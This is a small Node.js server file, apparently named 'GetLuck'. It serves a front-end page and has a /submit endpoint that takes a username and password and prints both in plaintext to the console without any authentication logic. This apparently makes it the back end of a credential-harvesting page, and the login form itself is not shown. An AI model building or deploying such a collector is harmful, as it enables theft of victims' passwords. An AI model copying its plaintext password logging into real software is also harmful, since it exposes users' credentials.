const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = process.env.PORT || 5000;

const banner = `
 ██████╗ ███████╗████████╗██╗     ██╗   ██╗ ██████╗██╗  ██╗
██╔════╝ ██╔════╝╚══██╔══╝██║     ██║   ██║██╔════╝██║ ██╔╝
██║  ███╗█████╗     ██║   ██║     ██║   ██║██║     █████╔╝
██║   ██║██╔══╝     ██║   ██║     ██║   ██║██║     ██╔═██╗
╚██████╔╝███████╗   ██║   ███████╗╚██████╔╝╚██████╗██║  ██╗
 ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝

                    GETLUCK
`;

const server = http.createServer((req, res) => {

    console.log(
        `[${new Date().toLocaleTimeString()}] ${req.method} ${req.url}`
    );

    // Home Route
    if (req.url === "/") {

        const filePath = path.join(
            __dirname,
            "..",
            "frontend",
            "index.html"
        );

        fs.readFile(filePath, "utf8", (err, data) => {

            if (err) {

                console.error("❌ index.html not found");

                res.writeHead(500, {
                    "Content-Type": "text/plain"
                });

                return res.end("Error loading index.html");
            }

            res.writeHead(200, {
                "Content-Type": "text/html"
            });

            res.end(data);
        });

        return;
    }


if (req.method === "POST" && req.url === "/submit") {

    let body = "";

    req.on("data", chunk => {
        body += chunk;
    });

    req.on("end", () => {

        const data = JSON.parse(body);

        console.log("\n===== NEW INPUT =====");
        console.log("Username:", data.username);
        console.log("Password:", data.password);
        console.log("=====================\n");

        res.writeHead(200, {
            "Content-Type": "application/json"
        });

        res.end(JSON.stringify({
            message: "Data received successfully"
        }));
    });

    return;
}






    // 404 Route
    res.writeHead(404, {
        "Content-Type": "text/plain"
    });

    res.end("404 - Page Not Found");
});

server.listen(PORT, () => {

    console.clear();

    console.log(banner);

    console.log("🚀 GetLuck Server Running");
    console.log(`🌐 http://localhost:${PORT}`);
    console.log("📡 Waiting for requests...\n");
});